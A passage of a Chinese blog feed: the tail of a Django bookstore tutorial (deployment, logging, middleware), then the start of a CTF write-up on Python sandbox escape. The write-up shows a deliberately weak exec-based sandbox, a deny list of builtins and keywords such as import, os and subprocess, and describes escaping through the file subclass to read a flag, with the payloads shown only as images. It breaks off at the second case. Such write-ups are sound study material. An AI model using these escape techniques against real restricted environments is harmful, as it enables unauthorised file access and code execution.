<span class="number">0</span>, books.id)</span><br><span class="line">        con.lpush(key, books.id)</span><br><span class="line">        <span class="comment"># 保存用户最近浏览的5个商品</span></span><br><span class="line">        con.ltrim(key, <span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义上下文</span></span><br><span class="line">    context = &#123;<span class="string">'books'</span>: books, <span class="string">'books_li'</span>: books_li&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用模板</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'books/detail.html'</span>, context)</span><br></pre></td></tr></table></figure></p><p>然后重写用户中心的视图函数代码：users/views.py中的user函数。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''用户中心-信息页'''</span></span><br><span class="line">    passport_id = request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line">    <span class="comment"># 获取用户的基本信息</span></span><br><span class="line">    addr = Address.objects.get_default_address(passport_id=passport_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取用户的最近浏览信息</span></span><br><span class="line">    con = get_redis_connection(<span class="string">'default'</span>)</span><br><span class="line">    key = <span class="string">'history_%d'</span> % passport_id</span><br><span class="line">    <span class="comment"># 取出用户最近浏览的5个商品的id</span></span><br><span class="line">    history_li = con.lrange(key, <span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line">    <span class="comment"># history_li = [21,20,11]</span></span><br><span class="line">    <span class="comment"># print(history_li)</span></span><br><span class="line">    <span class="comment"># 查询数据库,获取用户最近浏览的商品信息</span></span><br><span class="line">    <span class="comment"># books_li = Books.objects.filter(id__in=history_li)</span></span><br><span class="line">    books_li = []</span><br><span class="line">    <span class="keyword">for</span> id <span class="keyword">in</span> history_li:</span><br><span class="line">        books = Books.objects.get_books_by_id(books_id=id)</span><br><span class="line">        books_li.append(books)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'users/user_center_info.html'</span>, &#123;<span class="string">'addr'</span>: addr,</span><br><span class="line">                                                           <span class="string">'page'</span>: <span class="string">'user'</span>,</span><br><span class="line">                                                           <span class="string">'books_li'</span>: books_li&#125;)</span><br></pre></td></tr></table></figure></p><p>然后编写前端页面。重写user_center_info.html中最近浏览下面的html内容。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"common_title2"</span>&gt;</span>最近浏览<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"has_view_list"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_type_list clearfix"</span>&gt;</span></span><br><span class="line">        &#123;% for books in books_li %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=books.id %&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static books.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=books.id %&#125;"</span>&gt;</span>&#123;&#123; books.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"operate"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>￥&#123;&#123; books.price &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"unit"</span>&gt;</span>&#123;&#123; books.unit &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"add_books"</span> <span class="attr">title</span>=<span class="string">"加入购物车"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>最近浏览功能就实现了。</p><h1 id="14，前端过滤器实现"><a href="#14，前端过滤器实现" class="headerlink" title="14，前端过滤器实现"></a><a id="14">14，前端过滤器实现</a></h1><p>在users文件夹中新建templatetags文件夹。然后新建<strong>init</strong>.py文件，这是空文件。然后新建filters.py文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> Library</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个Library类的对象</span></span><br><span class="line">register = Library()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个过滤器函数</span></span><br><span class="line"><span class="meta">@register.filter</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_status</span><span class="params">(status)</span>:</span></span><br><span class="line">    <span class="string">'''返回订单状态对应的字符串'''</span></span><br><span class="line">    status_dict =  &#123;</span><br><span class="line">        <span class="number">1</span>:<span class="string">"待支付"</span>,</span><br><span class="line">        <span class="number">2</span>:<span class="string">"待发货"</span>,</span><br><span class="line">        <span class="number">3</span>:<span class="string">"待收货"</span>,</span><br><span class="line">        <span class="number">4</span>:<span class="string">"待评价"</span>,</span><br><span class="line">        <span class="number">5</span>:<span class="string">"已完成"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> status_dict[status]</span><br></pre></td></tr></table></figure></p><p>然后在根应用settings.py里面添加应用：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">'users.templatetags.filters'</span>, <span class="comment"># 过滤器功能</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>这样我们就能在前端使用这个过滤器了。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"15%"</span>&gt;</span>&#123;&#123; order.status | order_status &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>注意要在页面里<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load filters %&#125;</span><br></pre></td></tr></table></figure></p><h1 id="15，使用gunicorn-nginx-django进行部署"><a href="#15，使用gunicorn-nginx-django进行部署" class="headerlink" title="15，使用gunicorn+nginx+django进行部署"></a><a id="15">15，使用gunicorn+nginx+django进行部署</a></h1><p>安装nginx。<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> nginx</span><br></pre></td></tr></table></figure></p><p>先看nginx配置文件nginx.conf, 一般情况下, 路径为<code>/etc/nginx/nginx.conf</code><br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span> root;</span><br><span class="line"><span class="attribute">worker_processes</span> auto;</span><br><span class="line"><span class="attribute">pid</span> /run/nginx.pid;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">        <span class="attribute">worker_connections</span> <span class="number">768</span>;</span><br><span class="line">        <span class="comment"># multi_accept on;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># Basic Settings</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">sendfile</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">tcp_nopush</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">tcp_nodelay</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">keepalive_timeout</span> <span class="number">65</span>;</span><br><span class="line">        <span class="attribute">types_hash_max_size</span> <span class="number">2048</span>;</span><br><span class="line">        <span class="comment"># server_tokens off;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># server_names_hash_bucket_size 64;</span></span><br><span class="line">        <span class="comment"># server_name_in_redirect off;</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">include</span> /etc/nginx/mime.types;</span><br><span class="line">        <span class="attribute">default_type</span> application/octet-stream;</span><br><span class="line"></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># SSL Settings</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>; <span class="comment"># Dropping SSLv3, ref: POODLE</span></span><br><span class="line">        <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># Logging Settings</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">access_log</span> /var/log/nginx/access.log;</span><br><span class="line">        <span class="attribute">error_log</span> /var/log/nginx/error.log;</span><br><span class="line"></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># Gzip Settings</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">gzip</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">gzip_disable</span> <span class="string">"msie6"</span>;</span><br><span class="line">        <span class="comment"># gzip_vary on;</span></span><br><span class="line">        <span class="comment"># gzip_proxied any;</span></span><br><span class="line">        <span class="comment"># gzip_comp_level 6;</span></span><br><span class="line">        <span class="comment"># gzip_buffers 16 8k;</span></span><br><span class="line">        <span class="comment"># gzip_http_version 1.1;</span></span><br><span class="line">        <span class="comment"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># Virtual Host Configs</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">include</span> /etc/nginx/conf.d/<span class="regexp">*.conf</span>;</span><br><span class="line">        <span class="comment">#include /etc/nginx/sites-enabled/*;</span></span><br><span class="line"></span><br><span class="line">        <span class="section">server</span> &#123;</span><br><span class="line">            <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">            <span class="attribute">server_name</span> localhost;</span><br><span class="line">            <span class="attribute">location</span> / &#123;</span><br><span class="line">                <span class="attribute">proxy_pass</span> http://0.0.0.0:8000;</span><br><span class="line">                <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">                <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">                <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="attribute">error_page</span> <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /50x.html;</span><br><span class="line"></span><br><span class="line">            <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">                <span class="attribute">root</span> html;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="attribute">location</span> /media &#123;</span><br><span class="line">                <span class="attribute">alias</span> /root/bookstore/bookstore/static;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="attribute">location</span> /static &#123;</span><br><span class="line">                <span class="attribute">alias</span> /root/bookstore/bookstore/collect_static;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果<code>nginx</code>没启动，则执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nginx</span><br></pre></td></tr></table></figure></p><p>如果<code>nginx</code>已经启动，则执行以下命令重启<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nginx -s reload</span><br></pre></td></tr></table></figure></p><p>然后在根目录bookstore新建文件夹collect_static。<br>注意要在配置文件<code>settings.py</code>中写一行<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STATIC_ROOT = os.path.join(BASE_DIR, <span class="string">'collect_static'</span>)</span><br></pre></td></tr></table></figure></p><p>然后在根目录运行<code>python manage.py collectstatic</code>命令，这个命令用来收集静态文件。<br>并将books/models.py中添加代码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.files.storage <span class="keyword">import</span> FileSystemStorage</span><br><span class="line">fs = FileSystemStorage(location=<span class="string">'/root/bookstore/bookstore/collect_static'</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Books</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    image = models.ImageField(storage=fs, upload_to=<span class="string">'books'</span>, verbose_name=<span class="string">'商品图片'</span>)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p><p>然后在根目录运行<code>gunicorn</code>。安装<code>gunicorn</code>，<code>pip install gunicorn</code><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nohup</span> <span class="selector-tag">gunicorn</span> <span class="selector-tag">-w</span> 3 <span class="selector-tag">-b</span> 0<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-pseudo">:8000</span> <span class="selector-tag">bookstore</span><span class="selector-class">.wsgi</span><span class="selector-pseudo">:application</span> &amp;</span><br></pre></td></tr></table></figure></p><h1 id="16，django日志模块的使用"><a href="#16，django日志模块的使用" class="headerlink" title="16，django日志模块的使用"></a><a id="16">16，django日志模块的使用</a></h1><p>首先将下面的代码添加到配置文件<code>settings.py</code>。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">LOGGING = &#123;</span><br><span class="line">    <span class="string">'version'</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">'disable_existing_loggers'</span>: <span class="keyword">False</span>,</span><br><span class="line">    <span class="string">'formatters'</span>: &#123;             <span class="comment"># 日志输出的格式</span></span><br><span class="line">        <span class="string">'verbose'</span>: &#123;</span><br><span class="line">            <span class="string">'format'</span>: <span class="string">'%(levelname)s %(asctime)s %(module)s %(process)d %(thread)d %(message)s'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'simple'</span>: &#123;</span><br><span class="line">            <span class="string">'format'</span>: <span class="string">'%(levelname)s %(message)s'</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'handlers'</span>: &#123;               <span class="comment"># 处理日志的函数</span></span><br><span class="line">        <span class="string">'file'</span>: &#123;</span><br><span class="line">            <span class="string">'level'</span>: <span class="string">'DEBUG'</span>,</span><br><span class="line">            <span class="string">'class'</span>: <span class="string">'logging.FileHandler'</span>,</span><br><span class="line">            <span class="string">'filename'</span>: BASE_DIR + <span class="string">'/log/debug.log'</span>,</span><br><span class="line">            <span class="string">'formatter'</span>: <span class="string">'simple'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'loggers'</span>: &#123;</span><br><span class="line">        <span class="string">'django'</span>: &#123;</span><br><span class="line">            <span class="string">'handlers'</span>: [<span class="string">'file'</span>],</span><br><span class="line">            <span class="string">'propagate'</span>: <span class="keyword">True</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'django.request'</span>: &#123;     <span class="comment"># 日志的命名空间</span></span><br><span class="line">            <span class="string">'handlers'</span>: [<span class="string">'file'</span>],</span><br><span class="line">            <span class="string">'level'</span>: <span class="string">'DEBUG'</span>,</span><br><span class="line">            <span class="string">'propagate'</span>: <span class="keyword">True</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在根目录新建文件夹<code>log</code>。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> <span class="built_in">log</span></span><br></pre></td></tr></table></figure></p><p>然后在代码中添加日志相关的代码。例如，在<code>books/views.py</code>中，添加以下代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger = logging.getLogger(<span class="string">'django.request'</span>)</span><br></pre></td></tr></table></figure><p>在<code>books/views.py</code>中的<code>index</code>函数中添加一行：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.info(request.body)</span><br></pre></td></tr></table></figure></p><p>就会发现当我们访问首页的时候，在<code>log/debug.log</code>中有日志信息。</p><h1 id="17，中间件的编写"><a href="#17，中间件的编写" class="headerlink" title="17，中间件的编写"></a><a id="17">17，中间件的编写</a></h1><p>在<code>utils</code>文件夹中新建<code>middleware.py</code>文件。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> http</span><br><span class="line"><span class="comment"># 中间件示例，打印中间件执行语句</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookMiddleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        print(<span class="string">"Middleware executed"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别处理收到的请求和发出去的相应，要理解中间件的原理。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnotherMiddleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        print(<span class="string">"Another middleware executed"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_response</span><span class="params">(self, request, response)</span>:</span></span><br><span class="line">        print(<span class="string">"AnotherMiddleware process_response executed"</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录用户访问的url地址</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlPathRecordMiddleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">'''记录用户访问的url地址'''</span></span><br><span class="line">    EXCLUDE_URLS = [<span class="string">'/user/login/'</span>, <span class="string">'/user/logout/'</span>, <span class="string">'/user/register/'</span>]</span><br><span class="line">    <span class="comment"># 1./user/ 记录 url_path = /user/</span></span><br><span class="line">    <span class="comment"># 2./user/login/ url_path = /user/</span></span><br><span class="line">    <span class="comment"># 3./user/login_check/  url_path = /user/</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_view</span><span class="params">(self, request, view_func, *view_args, **view_kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 当用户请求的地址不在排除的列表中，同时不是ajax的get请求</span></span><br><span class="line">        <span class="keyword">if</span> request.path <span class="keyword">not</span> <span class="keyword">in</span> UrlPathRecordMiddleware.EXCLUDE_URLS <span class="keyword">and</span> <span class="keyword">not</span> request.is_ajax() <span class="keyword">and</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">            request.session[<span class="string">'url_path'</span>] = request.path</span><br><span class="line"></span><br><span class="line">BLOCKED_IPS = []</span><br><span class="line"><span class="comment"># 拦截在BLOCKED_IPS中的IP</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlockedIpMiddleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.META[<span class="string">'REMOTE_ADDR'</span>] <span class="keyword">in</span> BLOCKED_IPS:</span><br><span class="line">            <span class="keyword">return</span> http.HttpResponseForbidden(<span class="string">'&lt;h1&gt;Forbidden&lt;/h1&gt;'</span>)</span><br></pre></td></tr></table></figure><p>然后在配置文件<code>settings.py</code>中，写入中间件类的名字。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MIDDLEWARE_CLASSES = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">'utils.middleware.BookMiddleware'</span>,</span><br><span class="line">    <span class="string">'utils.middleware.AnotherMiddleware'</span>,</span><br><span class="line">    <span class="string">'utils.middleware.UrlPathRecordMiddleware'</span>,</span><br><span class="line">    <span class="string">'utils.middleware.BlockedIpMiddleware'</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这样就可以使用中间件了。</p>]]></content>
      
      <categories>
          
          <category> Django学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> django项目 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python沙箱逃逸（CTF）</title>
      <link href="/2018/10/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%EF%BC%88CTF%EF%BC%89/"/>
      <url>/2018/10/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%EF%BC%88CTF%EF%BC%89/</url>
      <content type="html"><![CDATA[<h1 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h1><pre><code>def make_secure():      UNSAFE = [&apos;open&apos;,                &apos;file&apos;,                &apos;execfile&apos;,                &apos;compile&apos;,                &apos;reload&apos;,                &apos;__import__&apos;,                &apos;eval&apos;,                &apos;input&apos;]      for func in UNSAFE:          del __builtins__.__dict__[func]  from re import findall  # Remove dangerous builtins  make_secure()  print &apos;Go Ahead, Expoit me &gt;;D&apos;  while True:      try:          print &quot;&gt;&gt;&gt;&quot;,          # Read user input until the first whitespace character          inp = findall(&apos;\S+&apos;, raw_input())[0]          a = None          # Set a to the result from executing the user input          exec &apos;a=&apos; + inp          print &apos;&gt;&gt;&gt;&apos;, a      except Exception, e:          print &apos;Exception:&apos;, e  </code></pre><p>下面是脚本运行的效果。<br><img src="\images\pasted-306.png" alt="upload successful"><br>效果相当于python的命令界面，我们的目标是读取当前目录下的flag文件。<br>如果题目没有任何的过滤，读取的命令如下，导入os包，然后直接执行命令。　<br><img src="\images\pasted-307.png" alt="upload successful"><br>但是直接导入os会报错，如下图<br><img src="\images\pasted-308.png" alt="upload successful"><br>因为 del 命令删除了对应的命令，如下图<br><img src="\images\pasted-310.png" alt="upload successful"><br>看了Ned Batchelder的分享后学到了新知识。我们可以用file对象read文件<br>下面是元类和元类型详细信息，元组，子对象<br><img src="\images\pasted-311.png" alt="upload successful"><br>由于file在索引40，我们可以硬编码。如下图<br><img src="\images\pasted-312.png" alt="upload successful"><br>用file类型读取flag文件。　<br><img src="\images\pasted-313.png" alt="upload successful"><br><br><br><br></p><h1 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h1><pre><code>#!/usr/bin/env python   from __future__ import print_function  print(&quot;Welcome to my Python sandbox! Enter commands below!&quot;)  banned = [        &quot;import&quot;,      &quot;exec&quot;,      &quot;eval&quot;,      &quot;pickle&quot;,      &quot;os&quot;,      &quot;subprocess&quot;,      &quot;kevin sucks&quot;,      &quot;input&quot;,      &quot;banned&quot;,      &quot;cry sum more&quot;,      &quot;sys&quot;  ]  targets = __builtins__.__dict__.keys()    